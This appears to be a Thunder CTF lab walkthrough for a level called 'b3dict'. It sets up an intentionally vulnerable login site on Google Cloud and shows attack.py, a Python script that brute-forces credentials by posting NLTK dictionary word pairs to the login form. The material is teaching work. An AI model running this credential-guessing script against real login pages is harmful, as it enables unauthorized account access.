<h3>Setup:</h3>
<p>Your virtual environment must be active to use thunder.py:</p>
<pre>source ../env-tctf/bin/activate</pre>
<pre>python3 thunder.py create websec/b3dict</pre>
<h3>Intro:</h3>
<p>Creating this level will start a vulnerable website which we can use to attack.<br/>
A range of NLTK words list is generated when level starts. We know that user name and password of your vulnerable website are chosen within that word range. <br/>
Use attack.py or write your own code to find valid credential.
</p>

---

<p>List the instances in the project.</p>
<pre>gcloud compute instances list</pre>
<P>You should be able to see two instances listed.
<p><b>b3-container-vm</b>: The application you will attack is running on this machine. (Take note of its EXTERNAL_IP and INTERNAL_IP)</p>
<p><b>b3-attack-instance</b>: We are going to launch attack from this instance.</p>

---
<p>Try browse website using EXTERNAL_IP in a browser </p>
<img src="../img/b3dict/login.png">
<p>Use Chrome webtool(f12) or Firefox debuggerto inspect the login form. </p>
<img src="../img/b3dict/ins.png">
<p>We can find that the name attributes of text inputs in login page are 'username' and 'password'(we will use this information in our code later). </p>
---
<p>Navigate to thunder-ctf/scripts/b3.</p>
<p>Take a look at attack.py and replace INTERNAL_IP/EXTERNAL_IP</p>
<pre>
import requests
import nltk
nltk.download('words')
from nltk.corpus import words

#word range printed in start message and start/b3dict.txt
#replace with [YOUR_BEGIN_INDEX:YOUR_END_INDEX+1]
#python list slice list[begin:end)
creds = words.words()[81003:81024]

#url='http://YOUR_INTERNAL_IP/login'
url='http://10.138.0.60/login'

#iterate over dictionary list for user names
for u in creds:
        #iterate over dictionary list for passwords
	for p in creds:
		#prepare data for post request
		payload={'username':u,'password':p}
                #send username and password through post method to web app url
		post=requests.Session().post(url, data=payload)
                #check if respond text contains invalid credentails
		if 'Invalid credentials' not in  post.text:
			#print valid username and password
			print(u+' '+p )

</pre>
<p>Note:We use NLTK, because we know the credential is generated from NLTK and the level has a word range provided. You can use any dictionary to attack.</p>
---
<p>If you want to attack from your local system which has pyhton installed. You can download scripts/b3 with the code below and use ENTERNAL_IP in your attack script</p>
<pre>cloudshell download scripts/b3/*</pre>
<p>You have to install python3, python-pip and pip install nltk before running the script </p>
<p>or<br/></p>
<p>If you want to use google cloud environment and avoid your account being suspended for suspicious activity, you need to launch attack with INTERNAL_IP from another instance.<br/>
b3-attack-instance and b3-container-vm are created in the same VPC network, so they are allowed to communicate with each other via internal ips 
</p>
<p>Copy scripts/b3 from cloud shell into your attack instance </p>
<pre>gcloud compute scp --recurse scripts/b3/*  b3-attack-instance:~/</pre>
<p>SSH into your attack instance </p>
<pre>gcloud compute ssh b3-attack-instance</pre>
<p>Install nltk </p>
<pre>
sudo apt update
sudo apt install python-pip
pip install nltk</pre>
---
<p>Run attack script</p>
<pre>python3 attack.py</pre>
<p>You should see a set of valid credential printed in your terminal. </p>
---
<p>Try if you can login with printed credential in a web browser </p>
